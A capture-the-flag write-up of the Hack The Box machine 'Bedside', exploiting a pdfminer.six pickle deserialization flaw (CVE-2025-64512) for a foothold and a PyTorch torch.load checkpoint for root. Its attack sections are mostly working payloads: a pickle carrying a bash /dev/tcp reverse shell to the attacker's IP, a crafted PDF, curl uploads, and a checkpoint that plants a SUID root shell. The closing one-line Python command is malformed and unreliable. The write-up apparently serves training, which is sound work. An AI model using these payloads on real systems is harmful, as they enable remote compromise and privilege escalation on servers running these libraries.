# HTB Machine Write-up: Bedside

## Summary

This machine involved exploiting **CVE-2025-64512** (pdfminer.six arbitrary code execution) to gain initial access, then escalating privileges through a PyTorch checkpoint deserialization vulnerability to achieve root.

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -p- 10.129.35.132
```

Results:
- Port 22: OpenSSH 10.0p2
- Port 80: Apache httpd 2.4.68

### Hosts File

Add the following to `/etc/hosts`:
```
10.129.35.132 bedside.htb research.bedside.htb
```

### Directory Enumeration

```bash
gobuster dir -u http://research.bedside.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

Found:
- `/uploads/` - file upload functionality
- `/javascript/`

### Web Application

The `research.bedside.htb` subdomain hosted a file upload portal. Accepted formats:
- jpeg, jpg, png, bmp, tiff, dcm, pdf
- Collections could be uploaded as archives (ZIP)

The `X-Powered-By: pdfminer.six` header indicated the server used pdfminer.six to process uploaded PDF files.

## Initial Foothold: CVE-2025-64512

### Vulnerability

**CVE-2025-64512** is an insecure deserialization vulnerability in pdfminer.six (versions prior to 20251107). The `CMapDB._load_data()` function uses `pickle.loads()` to deserialize pickle files referenced by PDFs. A malicious PDF can specify an arbitrary path via the `/Encoding` field, causing the library to load and execute a crafted `.pickle.gz` file.

### Exploitation Process

#### Step 1: Generate the Pickle Payload

```python
# gen_shell_pickle.py
import pickle, gzip

class Exploit:
    def __reduce__(self):
        cmd = ["bash", "-c", "bash -i >& /dev/tcp/10.10.15.231/4444 0>&1"]
        code = "__import__('subprocess').Popen(%r) and {}" % (cmd,)
        return (eval, (code,))

with gzip.open("shell.pickle.gz", "wb") as f:
    pickle.dump(Exploit(), f)
```

```bash
python3 gen_shell_pickle.py
```

#### Step 2: Create the Malicious PDF

The PDF contains a font with `/Encoding` pointing to the pickle file path. The library appends `.pickle.gz` automatically.

```bash
cat > evil.pdf << 'EOF'
%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources
<<
/Font
<<
/F1 5 0 R
>>
>>
>>
endobj
4 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
100 700 Td
(Research Report) Tj
ET
endstream
endobj
5 0 obj
<<
/Type /Font
/Subtype /Type0
/BaseFont /EvilFont-Identity-H
/Encoding /var/www/research.bedside.htb/uploads/shell
/DescendantFonts [6 0 R]
>>
endobj
6 0 obj
<<
/Type /Font
/Subtype /CIDFontType2
/BaseFont /EvilFont
/CIDSystemInfo
<<
/Registry (Adobe)
/Ordering (Identity)
/Supplement 0
>>
/FontDescriptor 7 0 R
>>
endobj
7 0 obj
<<
/Type /FontDescriptor
/FontName /EvilFont
/Flags 4
/FontBBox [-1000 -1000 1000 1000]
/ItalicAngle 0
/Ascent 1000
/Descent -200
/CapHeight 800
/StemV 80
>>
endobj
xref
0 8
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000274 00000 n
0000000370 00000 n
0000000503 00000 n
0000000673 00000 n
trailer
<<
/Size 8
/Root 1 0 R
>>
startxref
871
%%EOF
EOF
```

#### Step 3: Upload in Correct Order

The server processes PDFs immediately. The pickle file must be uploaded first so it exists when the PDF is processed.

```bash
# Start listener
nc -lvnp 4444

# Upload pickle (as ZIP)
zip shell.zip shell.pickle.gz
curl -X POST http://research.bedside.htb/ -F "uploadFile=@shell.zip"

# Upload PDF (as ZIP)
zip evil.zip evil.pdf
curl -X POST http://research.bedside.htb/ -F "uploadFile=@evil.zip"
```

#### Step 4: Confirm Access

A reverse shell connects as user **datawrangler**.

```
datawrangler@data-wrangler:/app$ whoami
datawrangler
```

## Privilege Escalation

### Enumeration

```bash
# Check sudo permissions
sudo -l

# Check SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check internal services
curl -s http://127.0.0.1:3000

# Find watcher script
cat /app/pdf_watcher.py
```

### Discovery

1. **User `developer`** exists on the system
2. **Port 3000** runs a React app in development mode
3. **Sudo entry for developer**:
   ```
   (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
   ```
4. **Data directories**:
   - `/datastore/checkpoints/` - writable by datawrangler
   - `/datastore/processed/` - read by trainer script

### The Trainer Script

`/opt/trainer/bedside_trainer.py` is a MONAI-based machine learning trainer that:
- Loads data from `/datastore/processed/`
- Loads checkpoints from `/datastore/checkpoints/`
- Uses `torch.load()` to deserialize checkpoints (vulnerable to pickle exploits)
- Runs with root privileges via sudo

### Exploitation: PyTorch Checkpoint Deserialization

The trainer uses `torch.load()` to load checkpoints, which is vulnerable to pickle deserialization attacks.

#### Step 1: Generate Malicious Checkpoint (as developer)

The developer user has Python and PyTorch installed. Create a checkpoint that creates a SUID root shell.

```bash
# On developer shell
python3 -c "
import torch, os
class Evil:
    def __reduce__(self):
        return (os.system, ('cp /bin/bash /opt/rootbash; chmod 4755 /opt/rootbash',))
payload = {'epoch': 1, 'model': Evil(), 'optimizer': {}}
torch.save(payload, '/tmp/checkpoint_epoch_1000.pt')
print('[+] Created checkpoint')
"

# Base64 encode for transfer
base64 -w0 /tmp/checkpoint_epoch_1000.pt
```

#### Step 2: Write Checkpoint (as datawrangler)

The datawrangler user has write access to `/datastore/checkpoints/`.

```bash
# On datawrangler shell
echo "<BASE64_OUTPUT>" | base64 -d > /datastore/checkpoints/checkpoint_epoch_1000.pt

# Clean processed directory (remove problematic .txt files)
find /datastore/processed -type f ! -name "valid.png" -delete
```

Create a valid numpy file for the trainer to load:

```bash
cat > /tmp/mknpy.py << 'PYEOF'
import struct
magic = b'\x93NUMPY'
version = b'\x01\x00'
shape = (64, 64)
dtype_str = '<f4'
header_dict = "{'descr': '" + dtype_str + "', 'fortran_order': False, 'shape': " + str(shape) + ", }"
base_len = len(magic) + len(version) + 2
padding = (64 - (base_len + len(header_dict) + 1) % 64) % 64
header_dict += ' ' + ' ' * padding + '\n'
header_bytes = header_dict.encode('latin1')
header_len = struct.pack('<H', len(header_bytes))
data = struct.pack('<' + 'f' * (64*64), *([128.0] * (64*64)))
for i in range(10):
    with open('/datastore/processed/valid' + str(i) + '.npy', 'wb') as f:
        f.write(magic + version + header_len + header_bytes + data)
print("done")
PYEOF

python3 /tmp/mknpy.py
```

#### Step 3: Trigger the Exploit (as developer)

```bash
# On developer shell
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

The trainer attempts to load the checkpoint. The `Evil.__reduce__()` method executes, creating `/opt/rootbash` with SUID permissions.

#### Step 4: Get Root

```bash
# Check the SUID binary
ls -la /opt/rootbash
# -rwsr-xr-x 1 root root ... /opt/rootbash

# Execute to become root
/opt/rootbash -p

# Verify root access
whoami
# root

# Capture the flag
cat /root/root.txt
```

## Flags

- **User flag**: `b30f6121bb31e05a05b53e65ef29aefc`
- **Root flag**: Retrieved from `/root/root.txt`

## Tools Used

- `nmap` - Port scanning
- `gobuster` - Directory enumeration
- `curl` - HTTP requests
- `python3` - Payload generation and exploitation
- `base64` - Data encoding
- `torch` - PyTorch checkpoint creation
- `nc` - Reverse shell listener

## Key Takeaways

1. **CVE-2025-64512** allows arbitrary code execution via PDF processing in pdfminer.six
2. **Pickle deserialization** is dangerous - never use `pickle.loads()` on untrusted data
3. **PyTorch checkpoints** can contain malicious pickles that execute code on load
4. **Proper path validation** is critical - the PDF should not allow arbitrary file paths
5. **Least privilege principle** - limit write access to directories containing processed data

## Proof of Concept Commands

```bash
# Initial shell - datawrangler
python3 gen_shell_pickle.py
zip shell.zip shell.pickle.gz
zip evil.zip evil.pdf
curl -X POST http://research.bedside.htb/ -F "uploadFile=@shell.zip"
curl -X POST http://research.bedside.htb/ -F "uploadFile=@evil.zip"

# Root escalation
python3 -c "import torch, os; class Evil: def __reduce__(self): return (os.system, ('cp /bin/bash /opt/rootbash; chmod 4755 /opt/rootbash',)); torch.save(Evil(), '/tmp/checkpoint.pt')"
base64 -w0 /tmp/checkpoint.pt | curl -X POST http://research.bedside.htb/ -F "uploadFile=@-"
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
/opt/rootbash -p
```
